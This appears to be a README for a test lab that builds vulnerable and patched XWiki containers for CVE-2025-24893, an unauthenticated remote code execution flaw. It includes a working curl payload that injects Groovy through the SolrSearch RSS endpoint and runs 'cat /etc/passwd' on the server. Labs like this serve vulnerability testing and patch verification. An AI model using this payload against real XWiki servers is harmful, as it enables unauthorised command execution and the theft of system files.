# XWiki CVE-2025-24893
This directory contains the deployment config for XWiki instances vulnerable and fixed to CVE-2025-24893.
Instances before version 15.10.10 or 16.4.0 (included) may allow an unauthenticated user to execute commands remotely on the server.

## How to Trigger the Vulnerability?
The following curl command allows to trigger the vulnerability:
```sh
curl 'http://127.0.0.1:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28%27cat+/etc/passwd%27.execute().text%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D' 
```
If the result includes the content of `/etc/passwd`, it confirms that the target is vulnerable.

## Vulnerable Setup
To build and start a vulnerable XWiki instance:
```sh
docker build --build-arg XWIKI_VERSION=15.10.10 --build-arg JAVA_VERSION=11.0.16 -t xwiki:15.10.10 .
docker run -d -p 8080:8080 --name xwiki -it xwiki:15.10.10
```
Running `docker logs xwiki` shows the execution logs of this docker instance.
The log entry `[XWiki-Init] XWiki installed with success` shows that XWiki has been successfuly installed and is ready to go. XWiki can then be accessed at http://127.0.0.1:8080/xwiki.

## Patched Setup
To build and start a patched XWiki instance:
```sh
docker build --build-arg XWIKI_VERSION=17.4.3 -t xwiki:17.4.3 .
docker run -d -p 8080:8080 --name xwiki -it xwiki:17.4.3
```

## Manual Installation Steps
By default, the script `xwiki-init.py` is executed and automates the following installation steps :
- Wait that XWiki / Jetty starts
- Connect to http://127.0.0.1:8080/xwiki
- Click on "Continue"
- Fulfill the form to create the admin account, then click on "Continue" after the success message is displayed
- Select the Flavor "XWiki Standard Flavor". The page may need to be reloaded if it does not display directly
- Click on "Continue" to continue with the installation process
- When XWiki is successfully set up, you will be redirected from `/bin/distribution/XWiki/Distribution` to `/bin/view/Main/`

If needed, it can be disabled by simply changing the last Dockerfile instruction with ```CMD ["./start_xwiki.sh"]```.
